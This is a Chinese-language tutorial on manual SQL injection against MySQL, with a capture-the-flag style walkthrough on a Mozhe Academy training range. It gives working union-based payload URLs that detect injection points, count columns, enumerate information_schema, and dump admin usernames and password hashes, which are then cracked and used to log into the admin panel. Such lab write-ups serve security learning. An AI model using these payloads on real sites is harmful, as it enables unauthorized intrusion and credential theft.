# 原创
：  SQL注入操作流程及实例演示+墨者学院靶场SQL手工注入漏洞测试(MySQL数据库)

# SQL注入操作流程及实例演示+墨者学院靶场SQL手工注入漏洞测试(MySQL数据库)

## 一、导图

## 二、MYSQL数据库结构

我们的数据库存储的数据按照下面的形式，网站对应数据库，数据库中有很多的数据表，数据表中有

很多的列，每一列中存储着数据。

所以SQL注入的过程就是先拿到网站的数据库名，再获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取列中的数据。

```
网站A=数据库A
        表名
            列名
                数据

网站B=数据库B
        表名
            列名
                数据

网站C=数据库C
        表名
            列名
                数据
```

###### -实例-

```
mysql&gt; show databases;            #展示数据库名
+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| sys                |
+--------------------+
6 rows in set (0.00 sec)

mysql&gt; use security;            #选择数据库
Database changed
mysql&gt; show tables;            #展示数据表
+--------------------+
| Tables_in_security |
+--------------------+
| emails             |
| referers           |
| uagents            |
| users              |
+--------------------+
4 rows in set (0.00 sec)

mysql&gt; select * from emails;            #展示数据列以及列下的数据
+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.00 sec)
```

## 三、判断是否存在注入点

方法一

```
真 且 真 = 真
and 1 = 1   页面正常
真 且 假 = 假
and 1 = 2   页面异常

------&gt;可能存在注入点
```

###### -实例-

```
原网址：
SELECT * FROM users WHERE id=1 LIMIT O，1

注入测试：
SELECT * FROM users WHERE id=1 and 1=1 LIMIT O，1    正常
SELECT * FROM users WHERE id=1 and 1=2 LIMIT O，1    错误
------&gt;可能存在注入点
```

方法二

```
在参数的后面随便输入一些乱七八糟的内容
返回页面正常
------&gt;不存在注入点
返回页面不正常
------&gt;可能存在注入点
```

原理：输入了乱七八糟的内容后，如果返回页面正常，则说明网页不受输入内容影响；返回页面不正常则说明网页将输入的内容带入数据库进行了查询，由于输入内容不正确，返回了页面则不正常，则说明这里可能存在注入点。

注意：当输入了一些乱七八糟的内容之后，网页返回“404错误”或者进行了跳转，则说明本网站对输入的内容可能有检测，则说明这个网站大概率没有注入漏洞。

###### -实例-

```
原网址：
219.153.49.228:48354/new_list.php?id=1

注入测试：
219.153.49.228:48354/new_list.php?id=1luanqibazaodneirong
返回页面不正常
------&gt;可能存在注入点
```

## 四、注入测试

```
参数x有注入，以下那个注入测试正确?
a. www.zhuruceshi.com/news.php?y=1 and1=1&amp;X=2
b. www.zhuruceshi.com/news.php?y=1&amp;x=2and 1=1
c. www.zhuruceshi.com/news.php?y=1 and 1=1&amp;x=2 and 1=1
d. www.zhuruceshi.com/news.php?xx= and 1=1&amp;xxx=2 and 1=1
```

以上四种注入测试中，b、c正确。

a错误的原因是：注入点不对，将”and1=1“放到了y的后面，而正确的注入点应该是x。

b为正常注入测试。

c分别在x、y后面都进行了注入测试，同样可以对x实现注入测试。

d错误的原因是：参数不正确，”xx“和”xxx“都不是注入目标。

###### -实例-

```
如果id参数存在注入，对网站“www.cnhgs.net/main.php?id=53&amp;page=1”应该怎么进行注入？
```

不能不管三七二十一直接在末尾添加“and1=1”进行注入测试，因为末尾参数是“page”，而不是注入目标“id”。

正确的注入方法有下面两种：

```
www.cnhgs.net/main.php?id=53 and 1=1&amp;page=1

www.cnhas.net/main.php?page=1&amp;id=53 and 1=1
```

注意：在使用工具进行注入测试时，工具默认在网址最后面添加“and 1=1”进行注入测试，如果不对此加以注意就可能产生错误。

此时若想正确注入，方法有下面两种：

```
在注入目标后添加“*”
www.cnhgs.net/main.php?id=53*&amp;page=1

更改参数位置，将注入目标放在最后面
www.cnhas.net/main.php?page=1&amp;id=53 and 1=1
```

## 五、猜解列数（字段数）

在网站末尾添加“order by + 数字“ ，寻找返回页面正确与错误的临界值，此值即为列数（字段数）。

###### -实例-

以下实例来自于墨者学院靶场

靶场地址为：[https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe](https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe)

```
http://124.70.22.208:46802/new_list.php?id=1 and 1=1 order by 1
返回页面正常
http://124.70.22.208:46802/new_list.php?id=1 and 1=1 order by 2
返回页面正常
http://124.70.22.208:46802/new_list.php?id=1 and 1=1 order by 3
返回页面正常
http://124.70.22.208:46802/new_list.php?id=1 and 1=1 order by 4
返回页面正常
http://124.70.22.208:46802/new_list.php?id=1 and 1=1 order by 5
返回页面不正常

------&gt;列数（字段数）为：4
```

上述五次猜解网页返回的页面如下所示：

## 六、报错猜解准备

在网站末尾添加“ union select + 1~列数 ”。

###### -实例-

```
http://124.70.22.208:46802/new_list.php?id=1 union select 1,2,3,4
```

## 七、报错猜解

将参数修改为错误值，让网页报错。

可以在参数值前加“-”；也可以在参数值位置随便输入一些乱七八糟的内容。

###### -实例-

```
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,2,3,4

http://124.70.22.208:46802/new_list.php?id=1luanqibazaodneirong union select 1,2,3,4
```

## 八、信息收集

根据上一步报错猜解网页返回的数字，对应修改网址，来进行信息收集。

返回的了两个数字，分别是“2”、“3”，因此，修改网址上的“2”、“3”为对应系统函数来进行信息收集。

系统函数如下：

```
数据库名：database()
数据库版本：version()
数据库用户名：user()
数据库路径：@@datadir
操作系统版本：@@version_compile_os
```

###### -实例-

```
使网页返回数据库名、数据库版本
http://124.70.22.208:46802/new_list.php?id=-1%20union select 1,database(),version(),4

使网页返回数据库用户名、数据库路径
http://124.70.22.208:46802/new_list.php?id=-1%20union select 1,user(),@@datadir,4

使网页返回操作系统版本
http://124.70.22.208:46802/new_list.php?id=-1%20union select 1,@@version_compile_os,3,4
```

## 九、版本探测的意义

在MYsQL5.0以上版本中，Mysql 有一个系统数据库“information_schema“。

它是一个存储记录有所有数据库名、表名、列名的数据库，相当于利用该表可以进行一次完整的注入，通过查询它获取指定数据库下面的表名、列名，进而帮助获取到具体的数据信息。

```
数据库中符号“ . ”代表下一级。
如：“diyi.dier”表示diyi数据库下的dier表。

information_schema数据库下面记录所有数据库名信息的表：information_schema.schemata
information_schema数据库下面记录所有表名信息的表：information_schema.tables
information_schema数据库下面记录所有列名信息的表：information_schema.columns

表名：table_name
列名：column_name
数据库名：table_schema
```

###### -实例-

```
查询指定数据库名“mozhe_Discuz_StormGroup”下的表名信息
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'
```

```
通过上述操作得到了据库“mozhe_Discuz_StormGroup”下的表名信息，接下来进一步查询列名信息：

查询指定表名“StormGroup_member”下的列名信息
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'
    
查询指定表名“notice”下的列名信息
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='notice'
```

```
通过上述操作得到了表名“StormGroup_member”和表名“notice”下的列名信息，接下来进一步查询指定数据信息：
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member
账号为：mozhe
密码为：356f589a7df439f6f744ff19bb8092c0
密码解密为：dsan13

经过测试，发现此账号密码并不正确，因此修改网址后再次查询：
http://124.70.22.208:46802/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1
账号为：mozhe
密码为：476aa2c1edd71f479d4c428e2ad9e785
密码解密为：664531
```

```
最终发现第二次查询到的账号密码正确，进入登录页面输入后点击“登录”便进入了此网站的管理后台。
在后台页面得到KEY：mozhe757d004432915faafed80fcbf3b
将KEY提交后便成功完成了本此漏洞利用。
```
